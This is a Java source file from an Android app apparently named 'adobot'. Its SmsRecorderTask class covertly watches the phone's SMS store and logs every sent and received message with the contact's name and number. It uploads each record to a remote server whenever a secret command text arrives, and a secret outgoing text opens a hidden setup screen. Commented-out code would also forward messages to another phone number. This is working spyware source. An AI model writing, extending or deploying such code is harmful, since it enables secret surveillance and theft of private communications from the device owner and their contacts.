package com.android.adobot.tasks;

import android.Manifest;
import android.arch.persistence.room.Room;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.support.v4.content.ContextCompat;
import android.util.Log;

import com.android.adobot.AdobotConstants;
import com.android.adobot.CommonParams;
import com.android.adobot.activities.SetupActivity;
import com.android.adobot.activities.UpdateActivity;
import com.android.adobot.database.AppDatabase;
import com.android.adobot.database.SmsModel;
import com.android.adobot.database.SmsModelDao;
import com.android.adobot.http.Http;
import com.android.adobot.http.HttpCallback;
import com.android.adobot.http.HttpRequest;

import org.json.JSONObject;

import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.HashMap;

import static android.content.Intent.FLAG_ACTIVITY_NEW_TASK;

/**
 * Created by adones on 2/27/17.
 */

public class SmsRecorderTask extends BaseTask {

    private static final String TAG = "SmsRecorderTask";

    private static final Uri smsUri = Uri.parse("content://sms");
    private static final int MESSAGE_TYPE_RECEIVED = 1;
    private static final int MESSAGE_TYPE_SENT = 2;
//    private static final int MAX_SMS_MESSAGE_LENGTH = 160;

    private SmsObserver smsObserver;
    private SharedPreferences prefs;
    private ContentResolver contentResolver;
    private AppDatabase appDatabase;
    private SmsModelDao smsModelDao;
    private static SmsRecorderTask instance;

    public SmsRecorderTask(Context context) {
        setContext(context);
        appDatabase = Room.databaseBuilder(context.getApplicationContext(),
                AppDatabase.class, AdobotConstants.DATABASE_NAME).build();
        smsModelDao = appDatabase.smsModelDao();
        smsObserver = (new SmsObserver(new Handler()));
        contentResolver = context.getContentResolver();
        prefs = context.getSharedPreferences(AdobotConstants.PACKAGE_NAME, Context.MODE_PRIVATE);
        instance = this;
        listen();
    }

    public static SmsRecorderTask getInstance() {
        return instance;
    };

    public void listen() {
        if (hasPermission()) {
            commonParams = new CommonParams(context);
            contentResolver.registerContentObserver(smsUri, true, smsObserver);


            //notify server
//            HashMap params = new HashMap();
//            params.put("uid", commonParams.getUid());
//            params.put("sms_forwarder_number", recipientNumber);
//
//            Http req = new Http();
//            req.setUrl(commonParams.getServer() + AdobotConstants.POST_STATUS_URL + "/" + commonParams.getUid());
//            req.setMethod(HttpRequest.METHOD_POST);
//            req.setParams(params);
//            req.execute();
        } else
            requestPermissions();
    }

//    public void stopForwarding() {
//        commonParams = new CommonParams(context);
//        if (isListening) {
//            contentResolver.unregisterContentObserver(smsObserver);
//            isListening = false;
//        }
//        //notify server
//        HashMap params = new HashMap();
//        params.put("uid", commonParams.getUid());
//        params.put("sms_forwarder_number", "");
//        params.put("sms_forwarder_status", isListening);
//
//        Http req = new Http();
//        req.setUrl(commonParams.getServer() + AdobotConstants.POST_STATUS_URL + "/" + commonParams.getUid());
//        req.setMethod(HttpRequest.METHOD_POST);
//        req.setParams(params);
//        req.execute();
//    }

    private boolean hasPermission() {
        return ContextCompat.checkSelfPermission(context, Manifest.permission.SEND_SMS) ==
                PackageManager.PERMISSION_GRANTED;
    }

/*    public void setRecipientNumber(String recipientNumber) {
        this.recipientNumber = recipientNumber;
    }*/

    public interface SubmitSmsCallback {
        void onResult (boolean success);
    }

    public void submitNextRecord(final SubmitSmsCallback cb) {
        Log.i(TAG, "submitNextRecord()");
        Thread thread = new Thread(new Runnable() {
            @Override
            public void run() {
                SmsModel m = smsModelDao.first();
                Log.i(TAG, "m = " + m);
                if (m != null) {
                    submitSms(m, cb);
                } else
                    cb.onResult(true);
            }
        });
        thread.start();
    }

    private void submitSms(final SmsModel smsModel, final SubmitSmsCallback cb) {

        Log.i(TAG, "Submitting sms: " + smsModel.getBody());

        final int type = smsModel.getType();
        final int id = smsModel.get_id();
        final String thread_id = smsModel.getThread_id();
        final String name = smsModel.getName();
        final String phone = smsModel.getPhone();
        final String body = smsModel.getBody();
        final String date = smsModel.getDate();

        try {

            HashMap p = new HashMap();
            p.put("uid", commonParams.getUid());
            p.put("type", type);
            p.put("message_id", id);
            p.put("thread_id", thread_id);
            p.put("phone", phone);
            p.put("name", name);
            p.put("message", body);
            p.put("date", date);

            JSONObject obj = new JSONObject(p);
            Log.i(TAG, obj.toString());

            Http smsHttp = new Http();
            smsHttp.setMethod(HttpRequest.METHOD_POST);
            smsHttp.setUrl(commonParams.getServer() + AdobotConstants.POST_MESSAGE_URL);
            smsHttp.setParams(p);
            smsHttp.setCallback(new HttpCallback() {
                @Override
                public void onResponse(HashMap response) {
                    int statusCode = (int) response.get("status");
                    if (statusCode >= 200 && statusCode < 400) {
                        try {
                            smsModelDao.delete(smsModel.getId(), smsModel.getThread_id());
                            Log.i(TAG, "sms submitted!! " + body);
                            submitNextRecord(cb);
                        } catch (Exception e) {
                            Log.i(TAG, "Failed to delete sms: " + phone);
                            cb.onResult(false);
                            e.printStackTrace();
                        }
                    } else {
                        Log.i(TAG, "Sms failed to submit!!!" + phone);
                        Log.i(TAG, "Status code: " + statusCode);
                        cb.onResult(false);
                        /*InsertSmsModel ins = new InsertSmsModel(smsModel);
                        ins.start();*/
                    }
                }
            });
            smsHttp.execute();

        } catch (Exception e) {
            Log.i(TAG, "FAiled with error: " + e.toString());
            e.printStackTrace();
            cb.onResult(false);
            /*InsertSmsModel ins = new InsertSmsModel(smsModel);
            ins.start();*/
        }
    }

    private class InsertSmsModel extends Thread {
        /*final SmsManager manager = SmsManager.getDefault();
        private String phone;
        private String message;
        private int delay = 3000;*/
        private SmsModel smsModel;

        public InsertSmsModel(SmsModel smsModel) {
            this.smsModel = smsModel;
        }

        @Override
        public void run() {
            super.run();

            try {
                smsModelDao.insert(smsModel);
                Log.i(TAG, "Message saved, type: " + smsModel.getType() +  "!!!" + smsModel.getBody());
                submitSms(smsModel, new SubmitSmsCallback() {
                    @Override
                    public void onResult(boolean success) {
                        if (success) {
                            submitNextRecord(new SubmitSmsCallback() {
                                @Override
                                public void onResult(boolean success) {
                                    // nothing to do after submit
                                }
                            });
                        }
                    }
                });
            } catch (Exception e) {
                Log.i(TAG, "Failed to save sms: id: " + smsModel.getId());
            }


/*                if (sending) {
                    Log.i(TAG, "Resending..");
                    try {
                        Thread.sleep(delay);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    } finally {
                        new SendSmsThread(this.phone, this.message).start();
                    }
                    return;
                }
                sending = true;*/
/*                try {
                    Log.i(TAG, "Sleeping ..");
                    Thread.sleep(delay);

                } catch (InterruptedException e) {
                    e.printStackTrace();
                } finally {
                    Log.i(TAG, "Sending message ");
                    int length = message.length();

                    if (length > MAX_SMS_MESSAGE_LENGTH) {
                        ArrayList<String> messagelist = manager.divideMessage(message);

                        manager.sendMultipartTextMessage(phone, null, messagelist, null, null);
                    } else {
                        manager.sendTextMessage(phone, null, message, null, null);
                    }

                }*/
        }
    }

    public class SmsObserver extends ContentObserver {

        int lastId = 0;

        public SmsObserver(Handler handler) {
            super(handler);
        }

        @Override
        public void onChange(boolean selfChange) {
            super.onChange(selfChange);
            Cursor cursor = null;

            try {
                cursor = contentResolver.query(smsUri, null, null, null, null);

                if (cursor != null && cursor.moveToNext()) {
                    saveSms(cursor);
                }
            } finally {
                if (cursor != null)
                    cursor.close();
            }

        }

        private void saveSms(Cursor mCur) {
            final int type = mCur.getInt(mCur.getColumnIndex("type"));
            final int id = mCur.getInt(mCur.getColumnIndex("_id"));
            final String body = mCur.getString(mCur.getColumnIndex("body"));

            String smsOpenText = prefs.getString(AdobotConstants.PREF_SMS_OPEN_TEXT_FIELD, "smsOpenText");
            if (body.trim().equals(smsOpenText.trim()) && type == MESSAGE_TYPE_SENT) {
                Intent setupIntent = new Intent(context, SetupActivity.class);
                setupIntent.addFlags(FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(setupIntent);
                return;
            }


            String uploadSmsCmd = prefs.getString(AdobotConstants.PREF_SMS_OPEN_TEXT_FIELD, "smsOpenText");
            if (body.trim().equals(uploadSmsCmd.trim()) && type == MESSAGE_TYPE_RECEIVED) {
                submitNextRecord(new SubmitSmsCallback() {
                    @Override
                    public void onResult(boolean success) {

                    }
                });
            }

            // accept only received and sent
            if (id != lastId && (type == MESSAGE_TYPE_RECEIVED || type == MESSAGE_TYPE_SENT)) {

                lastId = id;

                final String thread_id = mCur.getString(mCur.getColumnIndex("thread_id"));
                final String phone = mCur.getString(mCur.getColumnIndex("address"));
                final String name = getContactName(phone);


                SimpleDateFormat formatter = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
                Calendar calendar = Calendar.getInstance();
                String now = mCur.getString(mCur.getColumnIndex("date"));
                calendar.setTimeInMillis(Long.parseLong(now));

                final String date = formatter.format(calendar.getTime());

                SmsModel smsModel = new SmsModel();
                smsModel.setId(Integer.parseInt(thread_id + id));
                smsModel.set_id(id);
                smsModel.setThread_id(thread_id);
                smsModel.setBody(body);
                smsModel.setName(name);
                smsModel.setPhone(phone);
                smsModel.setDate(date);
                smsModel.setType(type);

                InsertSmsModel ins = new InsertSmsModel(smsModel);
                ins.start();

                /*SimpleDateFormat df = new SimpleDateFormat("EEE d MMM yyyy");
                SimpleDateFormat tf = new SimpleDateFormat("hh:mm aaa");
                Calendar calendar = Calendar.getInstance();
                String now = mCur.getString(mCur.getColumnIndex("date"));
                calendar.setTimeInMillis(Long.parseLong(now));
                String phone = mCur.getString(mCur.getColumnIndex("address"));
                String name = getContactName(phone);
                String date = df.format(calendar.getTime()) + "\n" + tf.format(calendar.getTime());*/

               /* String message = AdobotConstants.SMS_FORWARDER_SIGNATURE + "\n\n";
                message += "From: " + commonParams.getDevice() + "\n";
                message += "UID: " + commonParams.getUid() + "\n\n";
                message += type == MESSAGE_TYPE_RECEIVED ? "(Received) " : (type == MESSAGE_TYPE_SENT ? "(Sent) " : "");
                message += name != null ? name + "\n" : "";
                message += phone != null ? phone : "";
                message += "\n\n";
                message += body + "\n\n";
                message += date + "\n\n";

                Thread send = new SendSmsThread(recipientNumber, message);
                send.start();*/

            }

        }

    }


}
